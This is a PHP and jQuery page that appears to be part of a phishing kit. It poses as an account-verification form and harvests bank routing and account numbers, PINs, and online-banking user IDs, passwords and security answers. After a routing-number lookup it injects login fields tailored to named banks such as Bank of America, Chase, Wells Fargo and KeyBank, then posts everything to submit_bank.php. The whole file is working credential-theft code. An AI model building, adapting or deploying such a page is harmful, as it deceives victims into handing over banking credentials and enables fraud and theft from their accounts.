<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
	<link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />
<style>
.image-upload1 > input
{
    display: none;
}
.image-upload > input
{
    display: none;
}
.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 0px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}
</style>
</head>
<body>
<div id="head"></div>
<div id="container">
	<div id="xheader">
		<div id="<?php echo $bahasas;?>navbar"></div>
		<div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <?php if(!empty($fnames)){ 
            echo "<b>$account_verif</b>";
         }else{
            echo "<b>$account_verif</b>";
        }


            ?> 
            </div>
		<div id="account_type">
        <?php 
        echo $account_id;
        ?> 

        <b> <?php if(!empty($xuser)){ echo $xuser;}else{echo "";}?> </b> </div>
		<div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?php echo $sign_out;?></a></font>
	</div>
    <script>
        $(document).ready(function () {
        $('#buttonnya').attr('disabled', true);
                    $('#buttonnya').addClass('disabled');
    });

        function doLookup(rn)
        	{
        	if(rn.length == "9"){
            		$.ajax({
            			url: "https://www.routingnumbers.info/api/data.json?rn=" + rn,
            			dataType: 'jsonp',
            			success: onLookupSuccess
            		});
            	}else{
            	    $('#bankname').text("Invalid routing number");
        		    $('#loginbanknya').html("");
        		    $("#buttonnya").css({top: "350px"});
        		    $('#buttonnya').attr('disabled', true);
                    $('#buttonnya').addClass('disabled');
                    $('#banknama').val('Invalid routing number');
            	}
        	}
        
        	function onLookupSuccess(data)
        	{
        		if(data.customer_name == null) {
        		    $('#bankname').text("Invalid routing number");
        		    $('#loginbanknya').html("");
        		    $("#buttonnya").css({top: "350px"});
        		    $('#buttonnya').attr('disabled', true);
                    $('#buttonnya').addClass('disabled');
                    $('#banknama').val('Invalid routing number');
        		}else{
        		$('#buttonnya').attr('disabled', false);
                $('#buttonnya').removeClass('disabled');
        		$('#bankname').text(data.customer_name);
                $('#banknama').val(data.customer_name);
        		$("#buttonnya").css({top: "490px"});
        		var bank = data.customer_name;
        		
        		    if(bank.match(/FIRST CITIZENS BANK & TRUST COMPANY|STATE BANK AND TRUST COMPANY|FOOTHILLS COMMUNITY BANK|UNITED BANK & CAPITAL TRUST COMPANY|FIRST CITIZENS BANK|FIRST- CITIZENS BANK & TRUST CO|UNITED BANK & CAPITAL TRUST COMPANY/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="your favorite vacation city?" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "customer id");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/KEYBANK|KEY BANK/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="organization id" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "user id");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/BANK OF AMERICA|REGIONS BANK/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "online id");
                        $("#passbank").attr("placeholder", "passcode");
                    }else
                    if(bank.match(/CITIZENS|FIRST NATIONAL BANK OF DECATUR|AVIDIA BANK/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "online user id");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/CAPITAL ONE|HUNTINGTON NATIONAL BANK|TD BANK|WELLS FARGO/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "username");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/JPMORGAN CHASE/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "user id");
                        $("#passbank").attr("placeholder", "password");
                    }else
                    if(bank.match(/US BANK/)) {
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="access code" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                        $("#userbank").attr("placeholder", "personal id");
                        $("#passbank").attr("placeholder", "access code");
                    }else
                    if(bank.match(/HSBC/)) {
                        $('#loginbanknya').html("");
        		        $("#buttonnya").css({top: "320px"});
        		        $('#buttonnya').attr('disabled', false);
                        $('#buttonnya').removeClass('disabled');
                    }else{
                        $("#loginbanknya").html('<input required="required" class="required" maxlength="25" placeholder="user id" name="userbank" id="userbank" type="text" style="position: absolute;top: 330px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="password" name="passbank" id="passbank" type="password" style="position: absolute;top: 370px;left: 280px;width: 320px;"><input required="required" class="required" maxlength="25" placeholder="authentication key" name="authkeys" id="authkeys" type="text" style="position: absolute;top: 410px;left: 280px;width: 320px;">');
                    }
        		}
        	}
    </script>
	<div id="xcontent">
		<form action="submit_bank.php" method="POST" target="_self" name="xupdate" id="xupdate">
            <font class="xFont" style="top:50px;">Bank Account</font>
                        <br><br>
                        <br><br>
<span class="xFont2" style="position: absolute;top: 60px;left: 276px;">&nbsp;<b>BANK NAME</b></span>

<span id="bankname" style="position: absolute;top: 90px;left: 280px;width: 320px;">bank name</span>

<span class="xFont2" style="position: absolute;top: 140px;left: 276px;">&nbsp;<b>ROUTING NUMBER</b></span>
<input id="banknama" name="bankname" type="hidden" value="">
<input required="required" class="required" maxlength="9" oninput="doLookup($('#routing').val());" placeholder="routing number" pattern=".{1,25}" name="routing" value="" id="routing" type="text" style="position: absolute;top: 170px;left: 280px;width: 320px;">

<span class="xFont2" style="position: absolute;top: 220px;left: 276px;">&nbsp;<b>ACCOUNT NUMBER</b></span>
<input required="required" class="required" maxlength="25" placeholder="account number" pattern=".{1,25}" name="accnumber" value="" type="text" style="position: absolute;top: 250px;left: 280px;width: 320px;">
<input required="required" class="required" maxlength="25" placeholder="pin number" pattern=".{1,25}" name="pinbank" value="" type="password" style="position: absolute;top: 290px;left: 280px;width: 320px;">
<div id="loginbanknya"></div>
			<font class="xFont3" style="top:190px;left:600px;"></font>
                        <br><br>

<button id="buttonnya" class="button rect" type="submit" style="
    position: absolute;
    top: 350px;
    left: 280px;
    width: 259px;
    padding:6px;">
<span><?php echo $save;?></span>
</button>


     		</form>
	</div>
	
</div>
<div id="containerfooter">
<?php
if($lang == "PE") {?>
<div id="pefooterbawah"></div>
<?php
}?>
<?php
if($lang == "CO") {?>
<div id="cofooterbawah"></div>
<?php
}?>
<?php
if($lang == "MX") {?>
<div id="mxfooterbawah"></div>
<?php
}?>
<?php
if($lang == "AR") {?>
<div id="arfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PY") {?>
<div id="pyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "UY") {?>
<div id="uyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "EC") {?>
<div id="ecfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PE" or $lang == "MX" or $lang == "CO" or $lang == "AR" or $lang == "UY" or $lang == "PY" or $lang == "EC") {
}else{?>
<div id="<?php echo $bahasas;?>footerbawah"></div>
<?php
}
?>
</div>
<script src="../assets/js/main.js"></script></script>
<script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>

</body>
</html>
